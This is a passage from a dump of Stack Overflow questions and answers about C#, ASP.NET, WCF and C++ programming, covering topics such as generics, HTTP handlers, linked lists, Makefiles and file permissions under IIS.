</code></pre>

<p>By the way, note that, this is by no means related to the number of parameters. You can have as many type parameters as you like, as long as the compiler can infer them (according to C# specification generic type inference rules). For example, this extension method can be called without specifying type arguments:</p>

<pre><code>public static void SomeMethod&lt;T,U&gt;(this IEnumerable&lt;T&gt; collection, U anotherParameter)
</code></pre>
"
"<p>I have plenty of previous experience with linked lists in Java, but I seem to have confused myself with this simple attempt in C++. I am getting a segmentation fault at runtime, which from what I understand has to do with assigning a null pointer, but I am at a loss for a solution.</p>

<p>Edit: Thank you all for the very helpful responses. The code is now working, but trying to use <pre><code>delete p;</pre></code> at the end of linkedList::addNode results in a segmentation fault at runtime. Just curious if anyone knew why that is?</p>

<p>Here is my updated code:</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

class Node{
    public:
    	int data;
	Node * next;
	Node(int x){
		data = x;
		next = NULL;
		}
	Node(int x, Node * y){
		data = x; 
		next = y;
		}
    };


class linkedList{
Node *head;
public:
	linkedList(){
		head = NULL;
		}
	void addNode(int value){
		Node *p;
		if(head == NULL)
			head = new Node (value, NULL);
		else{
			p=head;
			while(p-&gt;next !=NULL)
				p=p-&gt;next;
			p-&gt;next = new Node (value, NULL);
			}
		}
	void print(){
		Node * p;
		p = head;
		while(p != NULL){
			cout &lt;&lt; p-&gt;data &lt;&lt; ""\n"";
			p = p-&gt;next;
			}
		}
};


int main(void){
linkedList test;
test.addNode(4);
test.addNode(76);
test.addNode(12);
test.print();
return(0);
}
</code></pre>
","33708","","<p>You are allocating space for nodes on stack and grabbing its address, which will go away as soon as the block ends and consequently, the address will be rendered invalid. You should allocate nodes using <code>new</code> operator on the heap instead:</p>

<pre><code>Node* node = new Node(value, NULL);
</code></pre>

<p>You should free everything you allocate on the heap as soon as you don't need it to prevent memory leak:</p>

<pre><code>delete node;
</code></pre>
"
"<p>I have an ashx handler:</p>

<pre><code>&lt;%@ WebHandler Language=""C#"" Class=""Thumbnail"" %&gt;

using System;
using System.Web;

public class Thumbnail : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        string imagePath = context.Request.QueryString[""image""];

        // split the string on periods and read the last element, this is to ensure we have
        // the right ContentType if the file is named something like ""image1.jpg.png""
        string[] imageArray = imagePath.Split('.');

        if (imageArray.Length &lt;= 1)
        {
            throw new HttpException(404, ""Invalid photo name."");
        }
        else
        {
            context.Response.ContentType = ""image/"" + imageArray[imageArray.Length - 1];
            context.Response.Write(imagePath);
        }
    }

    public bool IsReusable
    {
        get { return true; }
    }
}
</code></pre>

<p>For now all this handler does is get an image and return it. In my aspx page, I have this line:</p>

<pre><code>&lt;asp:Image ID=""Image1"" runat=""server"" CssClass=""thumbnail"" /&gt;
</code></pre>

<p>And the C# code behind it is:</p>

<pre><code>Image1.ImageUrl = ""Thumbnail.ashx?image=../Files/random guid string/test.jpg"";
</code></pre>

<p>When I view the web page, the images are not showing and the HTML shows exactly what I typed:</p>

<pre><code>&lt;img class=""thumbnail"" src=""Thumbnail.ashx?image=../Files%5Crandom guid string%5Cimages%5Ctest.jpg"" style=""border-width:0px;"" /&gt;
</code></pre>

<p>Can someone tell me why this isn't working? Unfortunately I only started working with ASP.NET yesterday and I have no idea how it works, so please keep the explanations simple if possible, thanks.</p>
","33708","","<p>You are printing out the path to the image instead of the actual image contents. Use</p>

<pre><code>context.Response.WriteFile(context.Server.MapPath(imagePath));
</code></pre>

<p>method instead.</p>

<p>Make sure you restrict the path to some safe location. Otherwise, you might introduce security vulnerabilities as users would be able to see contents of any file on the server.</p>
"
"<p>I have an array which really is a function, however i would like to use it as an array. I know i can write these</p>

<pre><code>int var { get{return v2;} }
public int this[int v] { get { return realArray[v]; }
</code></pre>

<p>but how do i implement a function that like an array? i would like to do something like</p>

<pre><code>public int pal[int i] { get { return i*2; } }
</code></pre>

<p>But that get a compile error </p>

<pre><code>error CS0650: Bad array declarator: To declare a managed array the rank specifier precedes the variable's identifier. To declare a fixed size buffer field, use the fixed keyword before the field type.
error CS0270: Array size cannot be specified in a variable declaration (try initializing with a 'new' expression)
</code></pre>
","33708","","<p>In C#, the only possible way to declare a parameterized property is an indexer. However, you could simulate something like that by creating a class that provides an indexer and adding a property of that type to your class:</p>

<pre><code>class ParameterizedProperty&lt;TProperty, TIndex&gt; {
     private Func&lt;TIndex, TProperty&gt; getter;
     private Action&lt;TIndex, TProperty&gt; setter;
     public ParameterizedProperty(Func&lt;TIndex, TProperty&gt; getter,
                                  Action&lt;TIndex, TProperty&gt; setter) {
        this.getter = getter;
        this.setter = setter;
     }
     public TProperty this[TIndex index] {
        get { return getter(index); }
        set { setter(index, value); }
     }   
}

class MyType {
    public MyType() {
        Prop = new ParameterizedProperty&lt;string, int&gt;(getProp, setProp);
    }
    public ParameterizedProperty&lt;string, int&gt; Prop { get; private set; }
    private string getProp(int index) {
        // return the stuff
    }
    private void setProp(int index, string value) {
        // set the stuff
    }
}

MyType test = new MyType();
test.Prop[0] = ""Hello"";
string x = test.Prop[0];
</code></pre>

<p>You can extend the idea to read only and write only properties by removing getter or setter from the class as appropriate.</p>
"
"<p>Is there a way to get the following function declaration?</p>

<pre><code>public bool Foo&lt;T&gt;() where T : interface;
</code></pre>

<p>ie. where T is an interface type (similar to <code>where T : class</code>, and <code>struct</code>).</p>

<p>Currently I've settled for:</p>

<pre><code>public bool Foo&lt;T&gt;() where T : IBase;
</code></pre>

<p>Where IBase is defined as an empty interface that is inherited by all my custom interfaces... Not ideal, but it should work... Why can't you define that a generic type must be an interface?</p>

<p>For what it's worth, I want this because <code>Foo</code> is doing reflection where it needs an interface type... I could pass it in as a normal parameter and do the necessary checking in the function itself, but this seemed alot more typesafe (and I suppose a little more performant, since all the checks are done at compiletime).</p>
","33708","","<p>No, actually, if you are thinking <code>class</code> and <code>struct</code> mean <code>class</code>es and <code>struct</code>s, you're wrong. <code>class</code> means <em>any reference type</em> (e.g. includes interfaces too) and <code>struct</code> means <em>any value type</em> (e.g. <code>struct</code>, <code>enum</code>).</p>
"
"<p>What is the simplest way to write a timer in C/C++?</p>

<p>Hi,</p>

<p>What is the simplest way to write a timer, say in C/C++? Previously I used a for loop and a do-while loop. I used the for loop as a counter and the do-while loop as a comparison for ""end of time"". The program worked as I wanted it to, but consumed too much system resources.</p>

<p>I'm looking for the simplest way to write a timer.</p>

<p>Thank you!</p>

<p>EDIT:</p>

<p>The program works on a set of servers both Linux and Windows, so it's a multiplatform environment. I dont want to use the unsleep or sleep function as I'm trying to write everything from scratch.</p>

<p>The nature of the program: The program counts power time and battery time on systems.</p>

<p>EDIT2:</p>

<p>OK, it seems that this caused some confusion so I'm going to try to explain what I have done so far. I've created a program that runs in the background and powers off the system if it's idle for a certain amount of time, it also checks for the battery life on a specific system and goes to stand by mode if the system has been running on battery for a while. I input the time manually so I need a timer. I want to write it from scratch as it's a part of a personal project I've been working on.</p>
","33708","","<p>You didn't mention the environment you're building a timer in. For example, microcontrollers usually have a timer/counter unit that raise interrupts at some intervals by counting the clock cycles and you can just handle their interrupts. </p>
"
"<p>I have a method which I would like to invoke asynchronously:</p>

<pre><code>void Foo()
{
}
</code></pre>

<p>I can indeed invoke this asynchronously by the following:</p>

<pre><code>delegate void DVoidMethod();
DVoidMethod FooDelegate = new DVoidMethod(Foo);
FooDelegate.BeginInvoke(null,null);
</code></pre>

<p>Has anyone got any alternatives?</p>

<p>I think three lines of code is too much?</p>
","33708","","<h2>Disclaimer:</h2>

<p><strong>Don't use this in real code. This is just an attempt to shorten the code OP mentioned. To do real async calls without getting results back, use:</strong></p>

<pre><code>ThreadPool.QueueUserWorkItem(stateObject =&gt; Foo());
</code></pre>

<p><hr /></p>

<p>Use <code>Action</code> and <code>Func</code> delegates in the framework:</p>

<pre><code>new Action(Foo).BeginInvoke(null, null);
</code></pre>

<p><code>Action&lt;T&gt;</code> has been around since 2.0. Other variants are added in 3.5. On 2.0, you can, however, declare a bunch of them somewhere manually for further use; or even better, use <a href=""http://www.albahari.com/nutshell/linqbridge.aspx"" rel=""nofollow"">LINQBridge</a>.</p>
"
"<p>I am almost embarrassed to ask this question, but as a long time C programmer I feel that perhaps I am not aware of the best way to do this in C#.</p>

<p>I have a member function that I need to return two lists of a custom type (<code>List&lt;MyType&gt;</code>) and I know beforehand that I will always have a return value of only two of these lists.</p>

<p>The obvious options are :</p>

<pre><code>public List&lt;List&lt;MyType&gt;&gt; ReturnTwoLists();
</code></pre>

<p>or</p>

<pre><code>public void ReturnTwoLists(ref List&lt;MyType&gt; listOne, ref List&lt;myType&gt; listTwo);
</code></pre>

<p>Both seem to be non-optimal.</p>

<p>Any suggestions on how to improve this?</p>

<p>The first way doesn't make it clear in the syntax that only 2 lists are being returned, and the second uses references rather then a return value, which seem so non-c#.</p>
","33708","","<p>First of all, that should probably be <code>out</code>, not <code>ref</code>.</p>

<p>Second, you can declare and return a type containing the two lists.</p>

<p>Third, you can declare a generic <code>Tuple</code> and return an instance of that:</p>

<pre><code>class Tuple&lt;T,U&gt; {
   public Tuple(T first, U second) { 
       First = first;
       Second = second;
   }
   public T First { get; private set; }
   public U Second { get; private set; }
}

static class Tuple {
   // The following method is declared to take advantage of
   // compiler type inference features and let us not specify
   // the type parameters manually.
   public static Tuple&lt;T,U&gt; Create&lt;T,U&gt;(T first, U second) {
        return new Tuple&lt;T,U&gt;(first, second);
   }
}

return Tuple.Create(firstList, secondList);
</code></pre>

<p>You can extend this idea for different number of items.</p>
"
"<p>With regards this example from Code Complete:</p>

<pre><code>Comparison Compare(int value1, int value2)
{
if ( value1 &lt; value2 )
 return Comparison_LessThan;
else if ( value1 &gt; value2 )
 return Comparison_GreaterThan;
else
 return Comparison_Equal;
}
</code></pre>

<p>You could also write this as:</p>

<pre><code>Comparison Compare(int value1, int value2)
{
 if ( value1 &lt; value2 )
  return Comparison_LessThan;

 if ( value1 &gt; value2 )
  return Comparison_GreaterThan;

 return Comparison_Equal;
}
</code></pre>

<p>Which is more optimal though? (readability, etc aside)</p>
","33708","","<p>Readability aside, the compiler should be smart enough to generate identical code for both cases.</p>
"
"<p>Imagine an in-house application aimed at the very technical user. The app maintains data. There isn't a <em>heck</em> of a load of data, but there is enough to make some sort of a query mechanism necessary.</p>

<p>The application's UI is very simple. It basically allows the user to enter a query (as text), and shows the data matching that query.</p>

<p>Had the back-end of the app been an SQL database, the user could just type the body of the WHERE clause. The app wouldn't be particularly friendly, but it would be acceptable for this task.</p>

<p>However, the data is not in a database. It's accessible through an <code>IEnumerable&lt;&gt;</code>.</p>

<p>Is there a reasonably easy way of getting similar functionality without writing a whole parser for a made-up query language? Ideally in the form of a free library, which provides something like the LINQ <code>.Where&lt;&gt;</code> method, except that the method takes the textual query entered by the user?</p>
","33708","","<p>Have you considered <a href=""http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx"" rel=""nofollow"">Dynamic LINQ</a>?</p>
"
"<p>I have a class that currently has several methods that take integer parameters. These integers map to operations that the application can perform. I'd like to make the class generic so that the consumers of the class can provide an enum type that they have with all the operations in it, then the methods will take parameters of that enum type. However, I want them to be able to not specify a generic type at all, and have it default back to integers with no change in syntax from the current way. Is this possible?</p>
","33708","","<p>The compiler can infer the type arguments on <strong>methods</strong> most of the time based on the type of the arguments passed:</p>

<pre><code>public void DoSomething&lt;T&gt;(T test) {
}
</code></pre>

<p>can be called with</p>

<pre><code>DoSomething(4);                   // = DoSomething&lt;int&gt;(4);
DoSomething(MyEnum.SomeValue);    // = DoSomething&lt;MyEnum&gt;(MyEnum.SomeValue);
</code></pre>

<p>By the way, you can have non-generic overloads of a generic method too.</p>
"
"<p>I am getting into C# and I am having this issue:</p>

<pre><code>namespace MyDataLayer
{
    namespace Section1
    {
        public class MyClass
        {
            public class MyItem
            {
                public static string Property1{ get; set; }
            }
            public static MyItem GetItem()
            {
                MyItem theItem = new MyItem();
                theItem.Property1 = ""MyValue"";
                return theItem;
            }
        }
     }
 }
</code></pre>

<p>I have this code on a UserControl:</p>

<pre><code>using MyDataLayer.Section1;

public class MyClass
{
    protected void MyMethod
    {
        MyClass.MyItem oItem = new MyClass.MyItem();
        oItem = MyClass.GetItem();
        someLiteral.Text = oItem.Property1;
    }
}
</code></pre>

<p>Everything works fine, except when I go to access <code>Property1</code>. The intellisense only gives me ""<code>Equals</code>, <code>GetHashCode</code>, <code>GetType</code>, and <code>ToString</code>"" as options. When I mouse over the <code>oItem.Property1</code>, Visual Studio gives me this explanation:</p>

<blockquote>
  <p><code>Member</code>MyDataLayer.Section1.MyClass.MyItem.Property1.get<code>cannot be accessed with an instance reference, qualify it with a type name instead</code></p>
</blockquote>

<p>I am unsure of what this means, I did some googling but wasn't able to figure it out. </p>
","33708","","<p>In C#, unlike VB.NET and Java, you can't access <code>static</code> members with instance syntax. You should do:</p>

<pre><code>MyClass.MyItem.Property1
</code></pre>

<p>to refer to that property or remove the <code>static</code> modifier from <code>Property1</code> (which is what you probably want to do). For a conceptual idea about what <a href=""http://stackoverflow.com/questions/413898/what-does-the-static-keyword-do-in-java/413904#413904""><code>static</code> is, see my other answer</a>.</p>
"
"<p>As mentioned in <a href=""http://stackoverflow.com/questions/1087982/single-objects-still-limited-to-2-gb-in-size-in-clr-4-0"">this question/comments</a> there are certain disadvantages when moving from 32 bit .NET to 64 bit .NET. </p>

<p>Probably the biggest advantage is the much bigger process address space in the 64 bit world, but what other pros and cons are worth noting?</p>
","33708","","<p>I've seen it to be noticeably faster (~ 4x in my experience) for some computationally-heavy (number-crunching) applications. The best thing is it comes for free in pure managed cases. You don't even have to recompile anything to get the benefits. Also, I've heard that the x64 JIT has more aggressive optimizations.</p>

<p>The biggest disadvantage is probably not being able to load 32-bit COM components in process.</p>
"
"<p>I have an assembly containing a mixture of Managed and unmanaged C++ code. I have signed it and installed into Global Assembly Cache. My program (.Net, C#) won't find it there, although it worked perfectly well when the assembly was in the program directory. The program uses DllImport and pinvoke to call the methods from the assembly. 
How can I make the program find my assembly in the GAC? Can I use exe.config or exe.manifest file to achieve this?</p>
","33708","","<p>No you can't. The way <code>DllImport</code> resolves libraries is completely different from they way runtime finds managed assemblies.</p>
"
"<p>Is it possible to restrict an attribute usage to just protected and public variables. I just want to restrict to private variables.</p>
","33708","","<p>No, you can't do that. You can restrict attribute usage only based on the type of the target, not anything else.</p>

<pre><code>[AttributeUsage(AttributeTargets.Method)]
public class MethodOnlyAttribute : Attribute { 
}
</code></pre>
"
"<p>I have a list of objects that have two int properties. The list is the output of another linq query. The object:</p>

<pre><code> public class DimensionPair  {

  public int Height { get; set; }
  public int Width { get; set; }
</code></pre>

<p>I want to find and return the object in the list which has the largest Height property value.</p>

<p>I can manage to get the highest value of the Height value but not the object itself.</p>

<p>Can I do this with Linq? How?</p>
","33708","","<p>This would require a sort (O(n <em>log</em> n)) but is very simple and flexible. Another advantage is being able to use it with LINQ to SQL:</p>

<pre><code>var maxObject = list.OrderByDescending(item =&gt; item.Height).First();
</code></pre>

<p>Note that this has the advantage of enumerating the <code>list</code> sequence just once. While it might not matter if <code>list</code> is a <code>List&lt;T&gt;</code> that doesn't change in the meantime, it could matter for arbitrary <code>IEnumerable&lt;T&gt;</code> objects. Nothing guarantees that the sequence doesn't change in different enumerations so methods that are doing it multiple times can be dangerous (and inefficient, depending on the nature of the sequence). However, it's still a less than ideal solution for large sequences. I suggest writing your own <code>MaxObject</code> extension manually if you have a large set of items to be able to do it in one pass without sorting and other stuff whatsoever (O(n)):</p>

<pre><code>static class EnumerableExtensions {
    public static T MaxObject&lt;T,U&gt;(this IEnumerable&lt;T&gt; source, Func&lt;T,U&gt; selector)
      where U : IComparable&lt;U&gt; {
       if (source == null) throw new ArgumentNullException(""source"");
       bool first = true;
       T maxObj = default(T);
       U maxKey = default(U);
       foreach (var item in source) {
           if (first) {
                maxObj = item;
                maxKey = selector(maxObj);
                first = false;
           } else {
                U currentKey = selector(item);
                if (currentKey.CompareTo(maxKey) &gt; 0) {
                    maxKey = currentKey;
                    maxObj = item;
                }
           }
       }
       if (first) throw new InvalidOperationException(""Sequence is empty."");
       return maxObj;
    }
}
</code></pre>

<p>and use it with:</p>

<pre><code>var maxObject = list.MaxObject(item =&gt; item.Height);
</code></pre>
"
"<p>I am creating a Class LLibrary in c# by using  microsoft provided Dll's. </p>

<p>Now i want to statically add those Microsoft provided libraries to My Dll.How can i do this. 
I have simply added a reference to those Microsoft provided Dlls and creating My Dll? Is it fine or not?</p>

<p>if  Microsoft provided dll is not available on other machine then my Dll may fails i need to add the libraries statically??</p>

<p>How can i do this??</p>
","33708","","<p>There's no such thing as statically linking to another assembly in .NET. There are some third party products such as <a href=""http://www.remotesoft.com/linker/"">.NET linker</a> that merge assemblies into one but they are unsupported.</p>

<p>If you have the redistribution license for that library, you can ship a copy along with your assembly. In Visual Studio you can make this happen by setting ""Copy Local"" to ""True"" in the properties window for that assembly reference.</p>
"
"<p>Right now I am working on a stub of a project. In the course of the project I need to be able to from a web front end set a message on a server to and then from an iPhone Query the Server to read the message.</p>

<p>While all the individual peices are working and my request is going through fine I am having trouble using  this webmethod </p>

<pre><code>[WebMethod()]
public void setMessage(string message)
{
    FileStream file = new FileStream(""mymessage.txt"", FileMode.OpenOrCreate, FileAccess.Write);
    StreamWriter sw = new StreamWriter(file);
    sw.Write(message);
    sw.Close();
    file.Close();
}
</code></pre>

<p>When I invoke this via HTTP Post using SOAP from an iPhone app. </p>

<p>I get the following xml in my console when I make the request.</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""&gt;
&lt;soap:Body&gt;
&lt;soap:Fault&gt;
&lt;faultcode&gt;soap:Server&lt;/faultcode&gt;
&lt;faultstring&gt;Server was unable to process request. ---&amp;gt; Access to the path 'c:\windows\system32\inetsrv\myMessage.txt' is denied.&lt;/faultstring&gt;
&lt;detail /&gt;
&lt;/soap:Fault&gt;
&lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>

<p>The Server is one configured by my boss, that is currently being used in other capacities as  an in house test server for several different projects.</p>

<p>The server is an IIS server I do not know what version, with ASP.NET configured and installed.</p>

<p>The script is located in a different place than the program is trying to write. I assume that the script is being run from that directory and that is why it is trying to write there. Is that the case or am I missing something fundamental?</p>

<p>If there are any alternative suggestions as to how I could go about this I would love to hear them as well, as I am working of a pretty small knowledge base.</p>

<p>Thanks! </p>
","33708","","<p>Change ""<code>filename.txt</code>"" to </p>

<pre><code>Server.MapPath(""filename.txt"")
</code></pre>

<p>or specify the full physical path of the file and grant NTFS permissions to the ASP.NET user to be able to access the folder.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.web.httpserverutility.mappath.aspx"" rel=""nofollow"">Server.MapPath</a> converts virtual paths (e.g. <code>~/helloworld.aspx</code>) to physical paths (e.g. <code>D:\WebSite\helloworld.aspx</code>).</p>
"
"<p>so, title will be it.</p>
","33708","","<p>What's wrong with <a href=""http://developer.apple.com/tools/interfacebuilder.html"" rel=""nofollow"">Interface Builder</a>? </p>
"
"<p>While investigating the D language, I came across GDC, a D Compiler for GCC.  I downloaded the version for MinGW from here:</p>

<p><a href=""http://sourceforge.net/projects/dgcc/files/"" rel=""nofollow"">http://sourceforge.net/projects/dgcc/files/</a></p>

<p>Documentation was almost nonexistent, but it did say that most of the command line switches were the same as for the GCC compiler.  However, that doesn't help me much, since I don't usually build with GCC.</p>

<p>GDC is described as a ""GCC front end"".  That makes me think that at some point it has to generate intermediate C++ or C that the GCC compiler can actually swallow.  I believe that this is how GCC compiles Objective-C programs.</p>

<p>What I want to know is this: Is there a way to get GDC to emit the intermediate C/C++ code as files that I can then inspect and compile by hand with GCC/MinGW?</p>
","33708","","<p>Basically, you need a <code>gcc</code> back-end that generates C/C++ as its target platform, rather than say, x86. This is completely possible but I'm not aware of an implementation that does this. By the way, if one exists, the output might not be very readable.</p>
"
"<p>I'm setting up my site to receive info from people via text message. The way it works is they text a number, that service then sends an HTTP POST to a url I specify. I've heard that .asmx files are better than .aspx files because they don't go through the whole page lifecycle. However, I don't really understand how to get a .asmx file running, and can you even call it with a POST, ie, www.mysite.com/webservice.asmx? I know I can make it work with a .aspx file, but I wanted to check to see if there was a better way before I undertake this endeavor.</p>

<p>Thanks for your insight!</p>
","33708","","<p>While any extension can be mapped to any handler in ASP.NET, by default <code>.aspx</code> is mapped to page handler and <code>.asmx</code> is mapped to Web service handler. I think you are looking for <code>.ashx</code> which represents a generic simple handler. You just need to implement <code>ProcessRequest</code> method of the <code>IHttpHandler</code> interface after adding one to your project (Add New Item <code>-&gt;</code> Generic Handler).</p>

<p>The <code>.ashx</code> works well if you want to manually process the request. Only if you want to provide a Web service (e.g. SOAP), you should go with <code>.asmx</code>. As a consequence, the best solution depends on the format of the HTTP POST request they send. If they send raw data in POST with their own specific protocol, go with <code>.ashx</code>. Otherwise, if they are using a standard RPC (SOAP, XML-RPC, ...) protocol, <code>.asmx</code> is probably better.</p>
"
"<p>I recently had a discussion with a colleague about serialization of byte data over a network.
He used the <code>BinaryFormatter</code> class to ""unparse"" the byte data I was sending to him. This did not work and he obviously had <em>exceptional</em>... exceptions. <code>Binaryformatter</code> could not ""unparse"" the data correctly since my data was simply a byte array.</p>

<p>His motivation for <code>BinaryFormatter</code> was platform independence. I am not persuaded of such a stance. When we both used <code>BinaryReader</code> or <code>BinaryWriter</code>, things worked well in code land.</p>

<p>What is the use therefore of <code>BinaryFormatter</code> and should I look at using it in each scenario wherever I need to send bytes over the wire?</p>
","33708","","<p>Definitely, if you have your data as <code>byte[]</code>, <code>BinaryFormatter</code> is not a wise thing to use. You just write the data out to the wire. However, if you have a set of objects and want to serialize them to a stream, <code>BinaryFormatter</code> is much easier to use than manually writing each field of each type by hand. The purpose of <code>BinaryFormatter</code> or any serializer/deserializer scheme in general is to provide a way to persist an object graph (possibly complex) as a sequence of bytes.</p>
"
"<p>Ok, so we all know Reflecttion is many time less performant than ""newing"" a class instance, and in many cases this is just fine depending on the application requirements. </p>

<p><strong><em>QUESTION: How can we create high performance .NET classes using a late binding (Reflection) strategy.</em></strong></p>

<p>I have an existing requirement that demands class instances be created using reflection (CreateInstance), but performance is critical. In my situation I am creating instances for every incoming SMS Message in our application. During production this could easily be over a million per day.</p>

<p>I would like to hear and share some ideas on how to create .NET classes without directly referencing the classes in code, for example using Reflection. I was also thinking if there is a way to somehow cache a class Factory that can improve the ""Creation"" time</p>
","33708","","<p>I don't think a million per day is too much for a simple reflection call. I believe you are over-optimizing but anyway, as you said, just create a factory class using a single <code>Activator.CreateInstance</code> call and cache that one. Actual instances will be created using the <code>CreateInstance()</code> method call on the returned object.</p>

<pre><code>public interface IClassFactory {
    IClass CreateInstance();
}

public interface IClass {
   // your actual class interface.
}

public class DefaultClassFactory : IClassFactory {
    public IClass CreateInstance() {
        return new DefaultClass(); // the implementation class
    }
}
</code></pre>

<p>Somewhere you'll have a <code>static</code> field of type <code>IClassFactory</code> which you'll set once with an instance of the <code>DefaultClassFactory</code> or any other classes specified in config file or whatever.</p>
"
"<p>I am trying to set up a page that will allow the user to browse a file directory on the Web server.</p>

<p>The aim is to allow users to drop files within a given directory structure and the code will create the tree view based off the directory.</p>

<p>When setting the Nodes Navigate URL it maps to the C:\Staging\Files which obvioulsy does not work on the web. I would need to map to <a href=""http://webaddress/staging/files"" rel=""nofollow"">http://webaddress/staging/files</a> etc</p>

<p>Here is the offending code</p>

<pre><code>    Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load


    If Not Page.IsPostBack Then
        '
        Dim rootDir As New DirectoryInfo(""C:\Staging\"")
        ' Enter the RecurseNodes function to recursively walk the directory tree. 
        Dim RootNode As TreeNode = RecurseNodes(rootDir)
        ' Add this Node hierarchy to the TreeNode control. 
        Treeview1.Nodes.Add(RootNode)
    End If
End Sub

Private Function RecurseNodes(ByVal thisDir As DirectoryInfo) As TreeNode


    Dim thisDirNode As New TreeNode(thisDir.Name, Nothing)
    ' Get all the subdirectories in this Directory. 
    Dim subDirs As DirectoryInfo() = thisDir.GetDirectories()
    For Each subDir As DirectoryInfo In subDirs
        thisDirNode.ChildNodes.Add(RecurseNodes(subDir))
    Next
    ' Now get the files in this Directory. 
    Dim files As FileInfo() = thisDir.GetFiles()
    For Each file As FileInfo In files
        Dim thisFileNode As New TreeNode(file.Name, Nothing)
        **thisFileNode.NavigateUrl = file.FullName**
        thisDirNode.ChildNodes.Add(thisFileNode)
    Next
    Return thisDirNode
End Function
</code></pre>
","33708","","<p>I think you should take the reverse approach. Rather than getting contents of a physical path on disk, try using <code>Server.MapPath</code> to grab contents of a virtual path combine it with a base URL:</p>

<pre><code>Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    If Not Page.IsPostBack Then
        Dim RootNode As TreeNode = RecurseNodes(""~/files"")
        TreeView1.Nodes.Add(RootNode)
    End If
End Sub

Private Overloads Function RecurseNodes(ByVal virtualPath As String) As TreeNode
    If Not VirtualPathUtility.IsAbsolute(virtualPath) Then virtualPath = VirtualPathUtility.ToAbsolute(virtualPath)
    virtualPath = VirtualPathUtility.RemoveTrailingSlash(virtualPath)
    Dim baseUrl As String = Request.Url.GetLeftPart(UriPartial.Authority) + virtualPath
    Return RecurseNodes(New DirectoryInfo(Server.MapPath(virtualPath)), baseUrl)
End Function

Private Overloads Function RecurseNodes(ByVal thisDir As DirectoryInfo, ByVal baseUrl As String) As TreeNode
    Dim thisDirNode As New TreeNode(thisDir.Name, Nothing)
    Dim subDirs As DirectoryInfo() = thisDir.GetDirectories()
    For Each subDir As DirectoryInfo In subDirs
        thisDirNode.ChildNodes.Add(RecurseNodes(subDir, baseUrl + subDir.Name + ""/""))
    Next
    Dim files As FileInfo() = thisDir.GetFiles()
    For Each file As FileInfo In files
        Dim thisFileNode As New TreeNode(file.Name, Nothing)
        thisFileNode.NavigateUrl = baseUrl + file.Name
        thisDirNode.ChildNodes.Add(thisFileNode)
    Next
    Return thisDirNode
End Function
</code></pre>
"
"<p>How I can make a Makefile, because it's the best way when you distribute a program by source code. Remember that this is for a C++ program and I'm starting in the C development world. But is it possible to make a Makefile for my Python programs?</p>
","33708","","<p>A simple <code>Makefile</code> usually consists of a set of targets, its dependencies, and the actions performed by each target:</p>

<pre><code>all: output.out

output.out: dependency.o dependency2.o
    ld -o output.out dependency.o dependency2.o

dependency.o: dependency.c
    gcc -o dependency.o dependency.c

dependency2.o: dependency2.c
    gcc -o dependency2.o dependency2.c
</code></pre>

<p>The target <code>all</code> (which is the first in the example) and tries to build its dependencies in case they don't exist or are not up to date. will be run when no target argument is specified in the <code>make</code> command. </p>
"
"<p>Imagine that during a </p>

<pre><code>foreach(var item in enumerable)
</code></pre>

<p>The enumerable items change. It will affect the current foreach?</p>

<p>Example:</p>

<pre><code>var enumerable = new List&lt;int&gt;();
enumerable.Add(1);
Parallel.ForEach&lt;int&gt;(enumerable, item =&gt;
{ 
     enumerable.Add(item + 1);
});
</code></pre>

<p>It will loop forever?</p>
","33708","","<p>Depends on the nature of the enumerator. Many of them throw exception when the collection changes.</p>

<p>For instance, <code>List&lt;T&gt;</code> throws an <code>InvalidOperationException</code> if the collection changes during enumeration.</p>
"
"<p>So I have an std::set which needs to keep specific ordering as well as not allowing duplicates of a user defined (by me) type. Now I can get the order to work correctly by overloading the '&lt;' operator in my type. However, the set does not appropriately detect duplicates, and to be honest I'm not entirely sure how it does this internally. I have overloaded the '==' operator, but somehow im not sure this is what the set is actually using? So the question is how does the set determine duplicates when you add values? Here is the relevant code:</p>

<p>The user defined type:</p>

<pre><code>//! An element used in the route calculation.
struct RouteElem {
    int shortestToHere; // Shortest distance from the start.
    int heuristic;		// The heuristic estimate to the goal.
    Coordinate position;
    bool operator&lt;( const RouteElem&amp; other ) const
    {
    	return (heuristic+shortestToHere) &lt; (other.heuristic+other.shortestToHere);
    }
    bool operator==( const RouteElem&amp; other ) const
    {
    	return (position.x == other.position.x &amp;&amp; position.y == other.position.y);
    }
};
</code></pre>

<p>So the elements are equivalent when their position is equivalent, and an element is less than another if its combined functional is less than that of the other. The sorting works, but the set will accept two elements of the same position.</p>
","33708","","<p><code>std::set</code> supports specifying a comparison function. The default is <code>less</code> which will use <code>operator &lt;</code> to check equality. You can define a custom function to check equality and use that one instead:</p>

<pre><code>std::set&lt;RouteElem, mycomparefunction&gt; myset;
</code></pre>

<p>Note that it's not possible to separate the comparison function from sorting function. <code>std::set</code> is a binary tree and if an element in a binary tree is not bigger nor smaller than a specific element, it should be in the same place. It does something like this in the place finding algorithm:</p>

<pre><code>if (a &lt; b) {
    // check the left subtree
} else if (b &lt; a) {
    // check the right subtree
} else {
    // the element should be placed here.
}
</code></pre>
"
"<p>I have written a simple WCF service that accepts and stores messages. It works fine when hosted locally. I still works when hosted on IIS 6. But when I enable the service's ability to store the messages to xml I get the following error: Access to c:\windows\system32\inetsrv\Onno.xml has been denied (translated from dutch, so may not match the true English error message).
This is curious as the service does not run from the mentioned directory. Moreover, the file onno.xml is not present. The service should create it as </p>

<pre><code>xelement.Save(""onno.xml"");
</code></pre>

<p>when </p>

<pre><code>File.Exists(""onno.xml"")==false
</code></pre>

<p>What is wrong? </p>

<ul>
<li>Do I have to specify a default directory for File IO operations inside IIS hosted WCF service?</li>
<li>Do I have to adjust permissions?</li>
</ul>

<p>Edit:
I tried to implement Mehrdad's solution with the MapPath function thus:</p>

<pre><code>   public void Persist(Message message)
    {
        foreach (var recipient in message.Recipients)//recipient is a string
        {
            XElement xml_messages;
            string path;
            try
            {
